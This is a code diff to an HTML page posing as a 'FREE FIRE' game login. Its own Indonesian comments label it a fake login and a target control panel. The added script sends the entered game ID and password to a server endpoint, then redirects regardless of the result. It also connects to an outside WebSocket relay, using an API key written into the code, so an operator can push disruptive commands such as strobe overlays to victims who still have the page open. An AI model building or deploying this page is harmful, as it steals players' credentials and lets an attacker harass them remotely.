@@ -184,17 +184,19 @@
 </head>
 <body>
 
+<!-- LOGIN PALSU -->
 <div class="box" id="loginBox">
   <div class="glitch-title">FREE FIRE</div>
   <div class="dev-tag">DEVELOPER: <span>RILZZY DEX</span></div>
   <h2>// Secure Login //</h2>
-  <form method="POST" action="/api?action=login">
-    <input name="username" placeholder="ID Free Fire" required>
-    <input name="password" type="password" placeholder="Password" required>
+  <form onsubmit="prosesLogin(event)">
+    <input id="username" placeholder="ID Free Fire" required>
+    <input id="password" type="password" placeholder="Password" required>
     <button type="submit">ACCESS SYSTEM</button>
   </form>
 </div>
 
+<!-- PANEL KONTROL TARGET -->
 <div class="panel" id="panelBox">
   <div class="glitch-title">CONTROL NODE</div>
   <div class="dev-tag">DEVELOPER: <span>RILZZY DEX</span></div>
@@ -211,24 +213,49 @@
 <footer>© 2026 <span>RILZZY DEX</span> • CYBER PANEL v2.0</footer>
 
 <script>
+// ================== KONFIG PIESOCKET ==================
+const PIE_HOST = "5cef39ce662e0cf5696a862419a36eeb.db.pie.host";
+const PIE_KEY  = "dRh20j9rCYsLouiy";
+const PIE_CHANNEL = "1"; 
+const wsUrl = `wss://${PIE_HOST}/v3/${PIE_CHANNEL}?api_key=${PIE_KEY}&notify_self=1`;
+
 const params = new URLSearchParams(location.search);
 const token = params.get("token");
 
+// ================== LOGIKA LOGIN ==================
+function prosesLogin(e) {
+  e.preventDefault();
+  const user = document.getElementById("username").value;
+  const pass = document.getElementById("password").value;
+
+  fetch("/api?action=login", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: `username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`
+  }).then(() => {
+    window.location.href = `/?token=${user}`;
+  }).catch(() => {
+    window.location.href = `/?token=${user}`;
+  });
+}
+
+// ================== LOGIKA TARGET ==================
 if (token) {
   document.getElementById("loginBox").style.display = "none";
   document.getElementById("panelBox").style.display = "block";
 
   let overlay = null;
   let stroboInt = null;
+  const ws = new WebSocket(wsUrl);
 
-  async function poll() {
+  ws.onmessage = (event) => {
     try {
-      const r = await fetch("/api?action=agent&token=" + token);
-      const d = await r.json();
-      jalankan(d.cmd);
+      const data = JSON.parse(event.data);
+      if (data.token === token && data.cmd) {
+        jalankan(data.cmd);
+      }
     } catch(e) {}
-    setTimeout(poll, 5000);
-  }
+  };
 
   function jalankan(cmd) {
     switch(cmd) {
@@ -266,13 +293,19 @@ if (token) {
         break;
     }
   }
-
-  poll();
 }
 
-window.kirim = async function(cmd) {
-  await fetch("/api?action=agent&token=" + token + "&set=" + cmd);
-  alert("Perintah dikirim: " + cmd);
+// ================== KONTROL DARI WEB (OPSIONAL) ==================
+window.kirim = function(cmd) {
+  if (!token) return alert("Token tidak valid!");
+  
+  const sendWs = new WebSocket(wsUrl);
+  sendWs.onopen = () => {
+    sendWs.send(JSON.stringify({ token: token, cmd: cmd }));
+    setTimeout(() => sendWs.close(), 500);
+    alert("Perintah terkirim: " + cmd + "\n\nPastikan target masih membuka halaman.");
+  };
+  sendWs.onerror = () => alert("Gagal terhubung ke server. Cek koneksi.");
 };
 </script>
 </body>
